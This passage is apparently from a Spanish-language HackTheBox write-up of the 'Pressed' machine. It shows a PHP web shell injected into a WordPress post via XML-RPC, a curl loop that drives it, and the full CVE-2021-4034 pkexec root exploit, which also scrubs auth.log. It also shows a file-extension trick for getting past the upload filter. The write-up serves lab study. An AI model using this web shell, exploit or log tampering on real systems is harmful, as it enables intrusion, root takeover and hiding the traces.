  <li>Nos da data en <code class="language-plaintext highlighter-rouge">url-encode</code>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>‚ûú  ~ php <span class="nt">--interactive</span>
Interactive shell

php <span class="o">&gt;</span> <span class="nb">echo </span>urldecode<span class="o">(</span><span class="s2">"%3C%3Fphp%20%20echo(file_get_contents('%2Fvar%2Fwww%2Fhtml%2Foutput.log'))%3B%20%3F%3E"</span><span class="o">)</span><span class="p">;</span>
&lt;?php  <span class="nb">echo</span><span class="o">(</span>file_get_contents<span class="o">(</span><span class="s1">'/var/www/html/output.log'</span><span class="o">))</span><span class="p">;</span> ?&gt;
</code></pre></div></div>

<ul>
  <li>
    <p>Al parecer la parte que vimos del <code class="language-plaintext highlighter-rouge">User Agent</code> viene del script <code class="language-plaintext highlighter-rouge">output.log</code>.</p>
  </li>
  <li>
    <p>Estamos como el administrador as√≠ que podemos cambiar el contenido del archivo.</p>
  </li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>‚ûú  ~ <span class="nb">cat </span>data
&lt;?php
	<span class="nb">echo</span> <span class="s2">"&lt;pre&gt;"</span> <span class="nb">.</span> shell_exec<span class="o">(</span><span class="nv">$_REQUEST</span><span class="o">[</span><span class="s1">'cmd'</span><span class="o">])</span> <span class="nb">.</span> <span class="s2">"&lt;/pre&gt;"</span><span class="p">;</span>
?&gt;
</code></pre></div></div>

<ul>
  <li>Pero tenemos que representarla en <code class="language-plaintext highlighter-rouge">base64</code>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>‚ûú  ~ <span class="nb">base64</span> <span class="nt">-w</span> 0 data<span class="p">;</span> <span class="nb">echo
</span>PD9waHAKCWVjaG8gIjxwcmU+IiAuIHNoZWxsX2V4ZWMoJF9SRVFVRVNUWydjbWQnXSkgLiAiPC9wcmU+IjsKPz4K
</code></pre></div></div>

<ul>
  <li>
    <p>Tendr√≠amos que cambiar el contenido para meter ese all√≠.</p>
  </li>
  <li>
    <p>Algo que podemos hacer es crearnos una variable que se iguale a todo los atributos del post existente.</p>
  </li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">&gt;&gt;&gt;</span> new_post <span class="o">=</span> post[0]
<span class="o">&gt;&gt;&gt;</span> new_post
&lt;WordPressPost: b<span class="s1">'UHC January Finals Under Way'</span><span class="o">&gt;</span>
</code></pre></div></div>

<ul>
  <li>Tiene lo mismo.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">&gt;&gt;&gt;</span> new_post.content
<span class="s1">'&lt;!-- wp:paragraph --&gt;\n&lt;p&gt;The UHC January Finals are underway!  After this event, there are only three left until the season one finals in which all the previous winners will compete in the Tournament of Champions. This event a total of eight players qualified, seven of which are from Brazil and there is one lone Canadian.  Metrics for this event can be found below.&lt;/p&gt;\n&lt;!-- /wp:paragraph --&gt;\n\n&lt;!-- wp:php-everywhere-block/php {"code":"JTNDJTNGcGhwJTIwJTIwZWNobyhmaWxlX2dldF9jb250ZW50cygnJTJGdmFyJTJGd3d3JTJGaHRtbCUyRm91dHB1dC5sb2cnKSklM0IlMjAlM0YlM0U=","version":"3.0.0"} /--&gt;\n\n&lt;!-- wp:paragraph --&gt;\n&lt;p&gt;&lt;/p&gt;\n&lt;!-- /wp:paragraph --&gt;\n\n&lt;!-- wp:paragraph --&gt;\n&lt;p&gt;&lt;/p&gt;\n&lt;!-- /wp:paragraph --&gt;'</span>
</code></pre></div></div>

<ul>
  <li>Vamos a cambiar el contenido solo la parte de base64.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">&gt;&gt;&gt;</span> new_post.content <span class="o">=</span> <span class="s1">'&lt;!-- wp:paragraph --&gt;\n&lt;p&gt;The UHC January Finals are underway!  After this event, there are only three left until the season one finals in which all the previous winners will compete in the Tournament of Champions. This event a total of eight players qualified, seven of which are from Brazil and there is one lone Canadian.  Metrics for this event can be found below.&lt;/p&gt;\n&lt;!-- /wp:paragraph --&gt;\n\n&lt;!-- wp:php-everywhere-block/php {"code":"PD9waHAKCWVjaG8gIjxwcmU+IiAuIHNoZWxsX2V4ZWMoJF9SRVFVRVNUWydjbWQnXSkgLiAiPC9wcmU+IjsKPz4K","version":"3.0.0"} /--&gt;\n\n&lt;!-- wp:paragraph --&gt;\n&lt;p&gt;&lt;/p&gt;\n&lt;!-- /wp:paragraph --&gt;\n\n&lt;!-- wp:paragraph --&gt;\n&lt;p&gt;&lt;/p&gt;\n&lt;!-- /wp:paragraph --&gt;'</span>
</code></pre></div></div>

<ul>
  <li>Ahora para editar el post real vamos a hacer lo siguiente.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">&gt;&gt;&gt;</span> client.call<span class="o">(</span>posts.EditPost<span class="o">(</span>new_post.id, new_post<span class="o">))</span>
True
</code></pre></div></div>

<ul>
  <li>Si recargamos la web desapareci√≥ la parte del <code class="language-plaintext highlighter-rouge">user agent</code>.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/hard/pressed/7.png" />
</p>

<ul>
  <li>Podemos ejecutar comandos.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/hard/pressed/8.png" />
</p>

<ul>
  <li>
    <p>Bueno esta m√°quina tiene <code class="language-plaintext highlighter-rouge">IPtables</code> por detr√°s y no podemos enviarnos una reverse <code class="language-plaintext highlighter-rouge">shell</code> por ning√∫n protocolo.</p>
  </li>
  <li>
    <p>Tenemos que crear una <code class="language-plaintext highlighter-rouge">webshell</code>.</p>
  </li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>‚ûú  wordpress_xmlrpc <span class="nb">cat </span>script.sh
<span class="c">#!/bin/bash</span>

<span class="k">function </span>ctrl_c<span class="o">(){</span>
    <span class="nb">echo</span> <span class="nt">-e</span> <span class="s2">"</span><span class="se">\n\n</span><span class="s2"> [+]Saliendo .... </span><span class="se">\n</span><span class="s2">"</span>
    <span class="nb">exit </span>1
<span class="o">}</span>

<span class="c">#Ctrl + c</span>
<span class="nb">trap </span>ctrl_c INT

<span class="nv">main_url</span><span class="o">=</span><span class="s2">"http://pressed.htb/index.php/2022/01/28/hello-world/?cmd="</span>

<span class="k">while</span> <span class="o">[</span> <span class="s2">"</span><span class="nv">$command</span><span class="s2">"</span> <span class="o">!=</span> <span class="s2">"exit"</span> <span class="o">]</span><span class="p">;</span> <span class="k">do
	</span><span class="nb">echo</span> <span class="nt">-n</span> <span class="s2">"</span><span class="nv">$~</span><span class="s2"> "</span> <span class="o">&amp;&amp;</span> <span class="nb">read</span> <span class="nt">-r</span> <span class="nb">command
	command</span><span class="o">=</span><span class="s2">"</span><span class="si">$(</span><span class="nb">echo</span> <span class="nv">$command</span> | <span class="nb">tr</span> <span class="s1">' '</span> <span class="s1">'+'</span><span class="si">)</span><span class="s2">"</span>

	curl <span class="nt">-s</span> <span class="nt">-X</span> GET <span class="s2">"</span><span class="nv">$main_url$command</span><span class="s2">"</span> | <span class="nb">grep</span> <span class="s2">"&lt;pre&gt;"</span> <span class="nt">-A</span> 100 | <span class="nb">grep</span> <span class="s2">"&lt;/pre&gt;"</span> <span class="nt">-B</span> 100 | <span class="nb">sed</span> <span class="s1">'s/&lt;pre&gt;//'</span> | <span class="nb">sed</span> <span class="s1">'s/&lt;\/pre&gt;//'</span> | <span class="nb">sed</span> <span class="s1">'s/shell//'</span>
<span class="k">done</span>
</code></pre></div></div>

<ul>
  <li>Podemos ejecutar comandos.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>‚ûú  wordpress_xmlrpc ./script.sh
<span class="nv">$~</span> <span class="nb">whoami
</span>www-data

<span class="nv">$~</span> <span class="nb">id
</span><span class="nv">uid</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span>

<span class="nv">$~</span> <span class="nb">hostname</span> <span class="nt">-I</span>
10.10.11.142
</code></pre></div></div>

<h2 id="privilege-escalation">Privilege Escalation</h2>

<ul>
  <li>Podemos ver la <code class="language-plaintext highlighter-rouge">flag</code> tambi√©n desde aqu√≠.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$~</span> <span class="nb">ls</span> <span class="nt">-l</span> /home/htb/user.txt
<span class="nt">-rw-r--r--</span> 1 root root 33 Jun 24 21:36 /home/htb/user.txt

<span class="nv">$~</span> <span class="nb">cat</span> /home/htb/user.txt
14a81d1565421c5c1461e1ad9b182b5b
</code></pre></div></div>

<ul>
  <li>No podemos cambiar de ruta por que no estamos dentro del sistema estamos desde fuera ejecutando comandos y como el script esta en la ruta <code class="language-plaintext highlighter-rouge">/var/www/html</code> por eso solo podemos quedarnos all√≠.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$~</span> <span class="nb">pwd
cd</span>/var/www/html

<span class="nv">$~</span> <span class="nb">cd</span> ..

<span class="nv">$~</span> <span class="nb">pwd</span>
/var/www/html
</code></pre></div></div>

<ul>
  <li>Podemos ir hacia atr√°s con este comando.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$~</span> <span class="nb">cd</span> ../ %26%26 <span class="nb">pwd</span>
/var/www
</code></pre></div></div>

<ul>
  <li>El <code class="language-plaintext highlighter-rouge">pkexec</code> es <code class="language-plaintext highlighter-rouge">SUID</code>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$~</span> <span class="nb">ls</span> <span class="nt">-l</span> /usr/bin/pkexec
<span class="nt">-rwsr-xr-x</span> 1 root root 23440 Jul 14  2021 /usr/bin/pkexec
</code></pre></div></div>

<ul>
  <li>Para poder explotarlo desde fuera vamos a necesitar el siguiente script en <code class="language-plaintext highlighter-rouge">bash</code>.</li>
  <li><a href="https://raw.githubusercontent.com/kimusan/pkwner/main/pkwner.sh">https://raw.githubusercontent.com/kimusan/pkwner/main/pkwner.sh</a></li>
  <li>Podemos ejecutar un id para ver si estamos como root.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>‚ûú  content <span class="nb">cat </span>pkwner.sh
<span class="c">#!/bin/bash</span>
<span class="nb">echo</span> <span class="s2">"‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ïó ‚ñà‚ñà‚ïó  ‚ñà‚ñà‚ïó‚ñà‚ñà‚ïó    ‚ñà‚ñà‚ïó‚ñà‚ñà‚ñà‚ïó   ‚ñà‚ñà‚ïó‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ïó‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ïó "</span>
<span class="nb">echo</span> <span class="s2">"‚ñà‚ñà‚ïî‚ïê‚ïê‚ñà‚ñà‚ïó‚ñà‚ñà‚ïë ‚ñà‚ñà‚ïî‚ïù‚ñà‚ñà‚ïë    ‚ñà‚ñà‚ïë‚ñà‚ñà‚ñà‚ñà‚ïó  ‚ñà‚ñà‚ïë‚ñà‚ñà‚ïî‚ïê‚ïê‚ïê‚ïê‚ïù‚ñà‚ñà‚ïî‚ïê‚ïê‚ñà‚ñà‚ïó"</span>
<span class="nb">echo</span> <span class="s2">"‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ïî‚ïù‚ñà‚ñà‚ñà‚ñà‚ñà‚ïî‚ïù ‚ñà‚ñà‚ïë ‚ñà‚ïó ‚ñà‚ñà‚ïë‚ñà‚ñà‚ïî‚ñà‚ñà‚ïó ‚ñà‚ñà‚ïë‚ñà‚ñà‚ñà‚ñà‚ñà‚ïó  ‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ïî‚ïù"</span>
<span class="nb">echo</span> <span class="s2">"‚ñà‚ñà‚ïî‚ïê‚ïê‚ïê‚ïù ‚ñà‚ñà‚ïî‚ïê‚ñà‚ñà‚ïó ‚ñà‚ñà‚ïë‚ñà‚ñà‚ñà‚ïó‚ñà‚ñà‚ïë‚ñà‚ñà‚ïë‚ïö‚ñà‚ñà‚ïó‚ñà‚ñà‚ïë‚ñà‚ñà‚ïî‚ïê‚ïê‚ïù  ‚ñà‚ñà‚ïî‚ïê‚ïê‚ñà‚ñà‚ïó"</span>
<span class="nb">echo</span> <span class="s2">"‚ñà‚ñà‚ïë     ‚ñà‚ñà‚ïë  ‚ñà‚ñà‚ïó‚ïö‚ñà‚ñà‚ñà‚ïî‚ñà‚ñà‚ñà‚ïî‚ïù‚ñà‚ñà‚ïë ‚ïö‚ñà‚ñà‚ñà‚ñà‚ïë‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ïó‚ñà‚ñà‚ïë  ‚ñà‚ñà‚ïë"</span>
<span class="nb">echo</span> <span class="s2">"‚ïö‚ïê‚ïù     ‚ïö‚ïê‚ïù  ‚ïö‚ïê‚ïù ‚ïö‚ïê‚ïê‚ïù‚ïö‚ïê‚ïê‚ïù ‚ïö‚ïê‚ïù  ‚ïö‚ïê‚ïê‚ïê‚ïù‚ïö‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïù‚ïö‚ïê‚ïù  ‚ïö‚ïê‚ïù"</span>
<span class="nb">echo</span> <span class="s2">"CVE-2021-4034 PoC by Kim Schulz"</span>
<span class="c"># shell poc by Kim Schulz</span>
<span class="nb">echo</span> <span class="s2">"[+] Setting up environment..."</span>
<span class="nb">mkdir</span> <span class="nt">-p</span> <span class="s1">'GCONV_PATH=.'</span>
<span class="nb">touch</span> <span class="s1">'GCONV_PATH=./pkwner'</span>
<span class="nb">chmod </span>a+x <span class="s1">'GCONV_PATH=./pkwner'</span>
<span class="nb">mkdir</span> <span class="nt">-p</span> pkwner
<span class="nb">echo</span> <span class="s2">"module UTF-8// PKWNER// pkwner 2"</span> <span class="o">&gt;</span> pkwner/gconv-modules
<span class="nb">cat</span> <span class="o">&gt;</span> pkwner/pkwner.c <span class="o">&lt;&lt;-</span> <span class="no">EOM</span><span class="sh">
#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;unistd.h&gt;
void gconv() {}
void gconv_init() {
  printf("hello");
  setuid(0); setgid(0);
	seteuid(0); setegid(0);
  system("PATH=/bin:/usr/bin:/usr/sbin:/usr/local/bin/:/usr/local/sbin;"
         "rm -rf 'GCONV_PATH=.' 'pkwner';"
         "cat /var/log/auth.log|grep -v pkwner &gt;/tmp/al;cat /tmp/al &gt;/var/log/auth.log;"
         "id");
	exit(0);
}
</span><span class="no">EOM

</span><span class="nb">cat</span> <span class="o">&gt;</span> pkwner/exec.c <span class="o">&lt;&lt;-</span> <span class="no">EOM</span><span class="sh">
#include &lt;stdlib.h&gt;
#include &lt;unistd.h&gt;
int main(){
  char *env[] = {"pkwner", "PATH=GCONV_PATH=.", "CHARSET=PKWNER",
                 "SHELL=pkwner", NULL};
  execve("/usr/bin/pkexec", (char *[]){NULL}, env);
}
</span><span class="no">EOM
</span><span class="nb">echo</span> <span class="s2">"[+] Build offensive gconv shared module..."</span>
gcc <span class="nt">-fPIC</span> <span class="nt">-shared</span> <span class="nt">-o</span> pkwner/pkwner.so pkwner/pkwner.c
<span class="nb">echo</span> <span class="s2">"[+] Build mini executor..."</span>
gcc <span class="nt">-o</span> pkwner/executor pkwner/exec.c
<span class="c"># export PATH="GCONV_PATH=."</span>
<span class="c"># export CHARSET="PKWNER"</span>
<span class="c">#export SHELL=pkwner</span>
<span class="nv">PATH</span><span class="o">=</span><span class="s1">'GCONV_PATH=.'</span> ./pkwner/executor
<span class="nb">echo</span> <span class="s2">"[+] Nice Job"</span>
</code></pre></div></div>

<ul>
  <li>Vamos a subirlo a la m√°quina desde el python3 interactivo.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">&gt;&gt;&gt;</span> from wordpress_xmlrpc.methods import media
<span class="o">&gt;&gt;&gt;</span> with open<span class="o">(</span><span class="s2">"pkwner.sh"</span>, <span class="s2">"r"</span><span class="o">)</span> as f:
...     filename <span class="o">=</span> f.read<span class="o">()</span>
...
<span class="o">&gt;&gt;&gt;</span> filename
<span class="s1">'#!/bin/bash\necho "‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ïó ‚ñà‚ñà‚ïó  ‚ñà‚ñà‚ïó‚ñà‚ñà‚ïó    ‚ñà‚ñà‚ïó‚ñà‚ñà‚ñà‚ïó   ‚ñà‚ñà‚ïó‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ïó‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ïó "\necho "‚ñà‚ñà‚ïî‚ïê‚ïê‚ñà‚ñà‚ïó‚ñà‚ñà‚ïë ‚ñà‚ñà‚ïî‚ïù‚ñà‚ñà‚ïë    ‚ñà‚ñà‚ïë‚ñà‚ñà‚ñà‚ñà‚ïó  ‚ñà‚ñà‚ïë‚ñà‚ñà‚ïî‚ïê‚ïê‚ïê‚ïê‚ïù‚ñà‚ñà‚ïî‚ïê‚ïê‚ñà‚ñà‚ïó"\necho "‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ïî‚ïù‚ñà‚ñà‚ñà‚ñà‚ñà‚ïî‚ïù ‚ñà‚ñà‚ïë ‚ñà‚ïó ‚ñà‚ñà‚ïë‚ñà‚ñà‚ïî‚ñà‚ñà‚ïó ‚ñà‚ñà‚ïë‚ñà‚ñà‚ñà‚ñà‚ñà‚ïó  ‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ïî‚ïù"\necho "‚ñà‚ñà‚ïî‚ïê‚ïê‚ïê‚ïù ‚ñà‚ñà‚ïî‚ïê‚ñà‚ñà‚ïó ‚ñà‚ñà‚ïë‚ñà‚ñà‚ñà‚ïó‚ñà‚ñà‚ïë‚ñà‚ñà‚ïë‚ïö‚ñà‚ñà‚ïó‚ñà‚ñà‚ïë‚ñà‚ñà‚ïî‚ïê‚ïê‚ïù  ‚ñà‚ñà‚ïî‚ïê‚ïê‚ñà‚ñà‚ïó"\necho "‚ñà‚ñà‚ïë     ‚ñà‚ñà‚ïë  ‚ñà‚ñà‚ïó‚ïö‚ñà‚ñà‚ñà‚ïî‚ñà‚ñà‚ñà‚ïî‚ïù‚ñà‚ñà‚ïë ‚ïö‚ñà‚ñà‚ñà‚ñà‚ïë‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ïó‚ñà‚ñà‚ïë  ‚ñà‚ñà‚ïë"\necho "‚ïö‚ïê‚ïù     ‚ïö‚ïê‚ïù  ‚ïö‚ïê‚ïù ‚ïö‚ïê‚ïê‚ïù‚ïö‚ïê‚ïê‚ïù ‚ïö‚ïê‚ïù  ‚ïö‚ïê‚ïê‚ïê‚ïù‚ïö‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïù‚ïö‚ïê‚ïù  ‚ïö‚ïê‚ïù"\necho "CVE-2021-4034 PoC by Kim Schulz"\n# shell poc by Kim Schulz\necho "[+] Setting up environment..."\nmkdir -p \'</span><span class="nv">GCONV_PATH</span><span class="o">=</span>.<span class="se">\'\n</span><span class="nb">touch</span> <span class="se">\'</span><span class="nv">GCONV_PATH</span><span class="o">=</span>./pkwner<span class="se">\'\n</span><span class="nb">chmod </span>a+x <span class="se">\'</span><span class="nv">GCONV_PATH</span><span class="o">=</span>./pkwner<span class="se">\'\n</span><span class="nb">mkdir</span> <span class="nt">-p</span> pkwner<span class="se">\n</span><span class="nb">echo</span> <span class="s2">"module UTF-8// PKWNER// pkwner 2"</span> <span class="o">&gt;</span> pkwner/gconv-modules<span class="se">\n</span><span class="nb">cat</span> <span class="o">&gt;</span> pkwner/pkwner.c <span class="o">&lt;&lt;-</span> <span class="no">EOM</span><span class="se">\n</span><span class="sh">#include &lt;stdio.h&gt;</span><span class="se">\n</span><span class="sh">#include &lt;stdlib.h&gt;</span><span class="se">\n</span><span class="sh">#include &lt;unistd.h&gt;</span><span class="se">\n</span><span class="sh">void gconv() {}</span><span class="se">\n</span><span class="sh">void gconv_init() {</span><span class="se">\n</span><span class="sh">  printf("hello");</span><span class="se">\n</span><span class="sh">  setuid(0); setgid(0);</span><span class="se">\n\t</span><span class="sh">seteuid(0); setegid(0);</span><span class="se">\n</span><span class="sh">  system("PATH=/bin:/usr/bin:/usr/sbin:/usr/local/bin/:/usr/local/sbin;"</span><span class="se">\n</span><span class="sh">         "rm -rf </span><span class="se">\'</span><span class="sh">GCONV_PATH=.</span><span class="se">\'</span><span class="sh"> </span><span class="se">\'</span><span class="sh">pkwner</span><span class="se">\'</span><span class="sh">;"</span><span class="se">\n</span><span class="sh">         "cat /var/log/auth.log|grep -v pkwner &gt;/tmp/al;cat /tmp/al &gt;/var/log/auth.log;"</span><span class="se">\n</span><span class="sh">         "id");</span><span class="se">\n\t</span><span class="sh">exit(0);</span><span class="se">\n</span><span class="sh">}</span><span class="se">\n</span><span class="sh">EOM</span><span class="se">\n\n</span><span class="sh">cat &gt; pkwner/exec.c &lt;&lt;- EOM</span><span class="se">\n</span><span class="sh">#include &lt;stdlib.h&gt;</span><span class="se">\n</span><span class="sh">#include &lt;unistd.h&gt;</span><span class="se">\n</span><span class="sh">int main(){</span><span class="se">\n</span><span class="sh">  char *env[] = {"pkwner", "PATH=GCONV_PATH=.", "CHARSET=PKWNER",</span><span class="se">\n</span><span class="sh">                 "SHELL=pkwner", NULL};</span><span class="se">\n</span><span class="sh">  execve("/usr/bin/pkexec", (char *[]){NULL}, env);</span><span class="se">\n</span><span class="sh">}</span><span class="se">\n</span><span class="sh">EOM</span><span class="se">\n</span><span class="sh">echo "[+] Build offensive gconv shared module..."</span><span class="se">\n</span><span class="sh">gcc -fPIC -shared -o pkwner/pkwner.so pkwner/pkwner.c</span><span class="se">\n</span><span class="sh">echo "[+] Build mini executor..."</span><span class="se">\n</span><span class="sh">gcc -o pkwner/executor pkwner/exec.c</span><span class="se">\n</span><span class="sh"># export PATH="GCONV_PATH=."</span><span class="se">\n</span><span class="sh"># export CHARSET="PKWNER"</span><span class="se">\n</span><span class="sh">#export SHELL=pkwner</span><span class="se">\n</span><span class="sh">PATH=</span><span class="se">\'</span><span class="sh">GCONV_PATH=.</span><span class="se">\'</span><span class="sh"> ./pkwner/executor</span><span class="se">\n</span><span class="sh">echo "[+] Nice Job"</span><span class="se">\n</span><span class="sh">'
&gt;&gt;&gt; data_upload = { 'name': 'pkwner.sh', 'bits': filename, 'type': 'text/plain'}
&gt;&gt;&gt; client.call(media.UploadFile(data_upload))
Traceback (most recent call last):
  File "&lt;stdin&gt;", line 1, in &lt;module&gt;
  File "/home/miguel/.local/lib/python3.11/site-packages/wordpress_xmlrpc/base.py", line 37, in call
    raw_result = server_method(*args)
                 ^^^^^^^^^^^^^^^^^^^^
  File "/usr/lib/python3.11/xmlrpc/client.py", line 1122, in __call__
    return self.__send(self.__name, args)
           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File "/usr/lib/python3.11/xmlrpc/client.py", line 1464, in __request
    response = self.__transport.request(
               ^^^^^^^^^^^^^^^^^^^^^^^^^
  File "/usr/lib/python3.11/xmlrpc/client.py", line 1166, in request
    return self.single_request(host, handler, request_body, verbose)
           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File "/usr/lib/python3.11/xmlrpc/client.py", line 1182, in single_request
    return self.parse_response(resp)
           ^^^^^^^^^^^^^^^^^^^^^^^^^
  File "/usr/lib/python3.11/xmlrpc/client.py", line 1354, in parse_response
    return u.close()
           ^^^^^^^^^
  File "/usr/lib/python3.11/xmlrpc/client.py", line 668, in close
    raise Fault(**self._stack[0])
xmlrpc.client.Fault: &lt;Fault 500: 'Could not write file pkwner.sh (Sorry, you are not allowed to upload this file type.).'&gt;
</span></code></pre></div></div>

<ul>
  <li>Nos da un error no podemos subir ese tipo de archivo es por la extensi√≥n que tiene vamos a cambiarla para ver si nos deja.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">&gt;&gt;&gt;</span> data_upload <span class="o">=</span> <span class="o">{</span> <span class="s1">'name'</span>: <span class="s1">'pkwner.png'</span>, <span class="s1">'bits'</span>: filename, <span class="s1">'type'</span>: <span class="s1">'text/plain'</span><span class="o">}</span>
<span class="o">&gt;&gt;&gt;</span> client.call<span class="o">(</span>media.UploadFile<span class="o">(</span>data_upload<span class="o">))</span>
<span class="o">{</span><span class="s1">'attachment_id'</span>: <span class="s1">'48'</span>, <span class="s1">'date_created_gmt'</span>: &lt;DateTime <span class="s1">'20240625T00:46:03'</span> at 0x7f932bf77ed0&gt;, <span class="s1">'parent'</span>: 0, <span class="s1">'link'</span>: <span class="s1">'/wp-content/uploads/2024/06/pkwner.png'</span>, <span class="s1">'title'</span>: <span class="s1">'pkwner.png'</span>, <span class="s1">'caption'</span>: <span class="s1">''</span>, <span class="s1">'description'</span>: <span class="s1">''</span>, <span class="s1">'metadata'</span>: False, <span class="s1">'type'</span>: <span class="s1">'text/plain'</span>, <span class="s1">'thumbnail'</span>: <span class="s1">'/wp-content/uploads/2024/06/pkwner.png'</span>, <span class="s1">'id'</span>: <span class="s1">'48'</span>, <span class="s1">'file'</span>: <span class="s1">'pkwner.png'</span>, <span class="s1">'url'</span>: <span class="s1">'/wp-content/uploads/2024/06/pkwner.png'</span><span class="o">}</span>
</code></pre></div></div>

<ul>
  <li>Tenemos la ruta donde se subi√≥.</li>
  <li>Y funciona somos <code class="language-plaintext highlighter-rouge">root</code> ya que le dijimos que nos ejecutara el comando <code class="language-plaintext highlighter-rouge">id</code>.</li>
</ul>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>‚ûú  wordpress_xmlrpc rlwrap ./script.sh
$~ bash /var/www/html/wp-content/uploads/2024/06/pkwner.png
‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ïó ‚ñà‚ñà‚ïó  ‚ñà‚ñà‚ïó‚ñà‚ñà‚ïó    ‚ñà‚ñà‚ïó‚ñà‚ñà‚ñà‚ïó   ‚ñà‚ñà‚ïó‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ïó‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ïó
‚ñà‚ñà‚ïî‚ïê‚ïê‚ñà‚ñà‚ïó‚ñà‚ñà‚ïë ‚ñà‚ñà‚ïî‚ïù‚ñà‚ñà‚ïë    ‚ñà‚ñà‚ïë‚ñà‚ñà‚ñà‚ñà‚ïó  ‚ñà‚ñà‚ïë‚ñà‚ñà‚ïî‚ïê‚ïê‚ïê‚ïê‚ïù‚ñà‚ñà‚ïî‚ïê‚ïê‚ñà‚ñà‚ïó
‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ïî‚ïù‚ñà‚ñà‚ñà‚ñà‚ñà‚ïî‚ïù ‚ñà‚ñà‚ïë ‚ñà‚ïó ‚ñà‚ñà‚ïë‚ñà‚ñà‚ïî‚ñà‚ñà‚ïó ‚ñà‚ñà‚ïë‚ñà‚ñà‚ñà‚ñà‚ñà‚ïó  ‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ïî‚ïù
‚ñà‚ñà‚ïî‚ïê‚ïê‚ïê‚ïù ‚ñà‚ñà‚ïî‚ïê‚ñà‚ñà‚ïó ‚ñà‚ñà‚ïë‚ñà‚ñà‚ñà‚ïó‚ñà‚ñà‚ïë‚ñà‚ñà‚ïë‚ïö‚ñà‚ñà‚ïó‚ñà‚ñà‚ïë‚ñà‚ñà‚ïî‚ïê‚ïê‚ïù  ‚ñà‚ñà‚ïî‚ïê‚ïê‚ñà‚ñà‚ïó
‚ñà‚ñà‚ïë     ‚ñà‚ñà‚ïë  ‚ñà‚ñà‚ïó‚ïö‚ñà‚ñà‚ñà‚ïî‚ñà‚ñà‚ñà‚ïî‚ïù‚ñà‚ñà‚ïë ‚ïö‚ñà‚ñà‚ñà‚ñà‚ïë‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ïó‚ñà‚ñà‚ïë  ‚ñà‚ñà‚ïë
‚ïö‚ïê‚ïù     ‚ïö‚ïê‚ïù  ‚ïö‚ïê‚ïù ‚ïö‚ïê‚ïê‚ïù‚ïö‚ïê‚ïê‚ïù ‚ïö‚ïê‚ïù  ‚ïö‚ïê‚ïê‚ïê‚ïù‚ïö‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïù‚ïö‚ïê‚ïù  ‚ïö‚ïê‚ïù
CVE-2021-4034 PoC by Kim Schulz
[+] Setting up environment...
[+] Build offensive gconv shared module...
[+] Build mini executor...
uid=0(root) gid=0(root) groups=0(root),33(www-data)
hello[+] Nice Job
</code></pre></div></div>

<ul>
  <li>Modificamos el script.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>‚ûú  content <span class="nb">cat </span>new.sh
<span class="c">#!/bin/bash</span>
